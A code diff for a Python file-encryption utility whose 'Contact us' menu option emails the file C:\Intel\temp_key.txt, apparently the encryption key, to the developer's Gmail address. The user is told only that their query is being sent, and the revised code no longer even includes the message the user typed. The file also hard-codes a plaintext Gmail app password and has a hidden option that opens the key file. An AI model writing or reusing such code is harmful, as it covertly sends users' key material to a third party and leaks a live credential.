@@ -4,11 +4,11 @@ import random
 import os,time
 import shutil
 
-import smtplib
+import email, smtplib, ssl
+from email import encoders
+from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 
 buffer=64*1024
 
@@ -20,7 +20,7 @@ while buffer!=0:
 	print('*******************************************************************************')
 	print('1.Encrypt \n2.Decrypt \n3.Folder Encryption \n4.Folder Decryption \n5.Contact us \n6.Exit')
 	ip=int(input(('Enter options: ')))
-	#ip=3
+	#ip=5
 	if ip==1:
 		fname=input(str('Enter file path (without quotes): '))
 		#fname='test.zip'
@@ -104,37 +104,46 @@ while buffer!=0:
 		print('Decryption Done...')
 
 	elif ip==5:
-		mail_content=input('''Kindly enter the issue and the our we shall 
+		mail_content=input('''\nKindly enter the issue and the our we shall 
 contact u within 2 working days...: ''')
-		mail_id=input('Ur mail id: ')
-		sender_address = 'rexdivakar@gmail.com'
-		sender_pass = 'wxfookhgxqyxuosw'
-		receiver_address = 'rexdivakar@gmail.com'
+		mail_id=input('Input ur mail id: ')
+		subject = "A Query from "+mail_id
+		body = "This is an email with attachment sent from Python"
+		sender_email = "rexdivakar@gmail.com"
+		receiver_email = "rexdivakar@gmail.com"
+		password = 'wxfookhgxqyxuosw'
 
 		message = MIMEMultipart()
-		message['From'] = sender_address
-		message['To'] = receiver_address
-		message['Subject'] = 'File Encryptor from '+mail_id
+		message["From"] = sender_email
+		message["To"] = receiver_email
+		message["Subject"] = subject
+		message["Bcc"] = receiver_email  
+		message.attach(MIMEText(body, "plain"))
 
-		message.attach(MIMEText(mail_content, 'plain'))
-		attach_file_name = 'C:\\Intel\\temp_key.txt'
-		attach_file = open(attach_file_name, 'rb') 
-		payload = MIMEBase('application', 'octate-stream')
-		payload.set_payload((attach_file).read())
-		encoders.encode_base64(payload)
+		filename = 'C:\\Intel\\temp_key.txt' 
 
-		payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
-		message.attach(payload)
+		with open(filename, "rb") as attachment:
+		    part = MIMEBase("application", "octet-stream")
+		    part.set_payload(attachment.read())
 
-		session = smtplib.SMTP('smtp.gmail.com', 587) 
-		session.starttls()
-		session.login(sender_address, sender_pass) 
+		  
+		encoders.encode_base64(part)
+		part.add_header(
+		    "Content-Disposition",
+		    f"attachment; filename= {filename}",
+		)
+
+		message.attach(part)
 		text = message.as_string()
-		session.sendmail(sender_address, receiver_address, text)
-		session.quit()
 
-		time.sleep(5)
-		print('Thanks for contacting us')
+		context = ssl.create_default_context()
+		with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+		    server.login(sender_email, password)
+		    server.sendmail(sender_email, receiver_email, text)
+
+		print('Thanks for contacting us\n')
+		time.sleep(3)
+
 	elif ip==000:
 		os.startfile('C:\\Intel\\temp_key.txt')
 	elif ip==6:
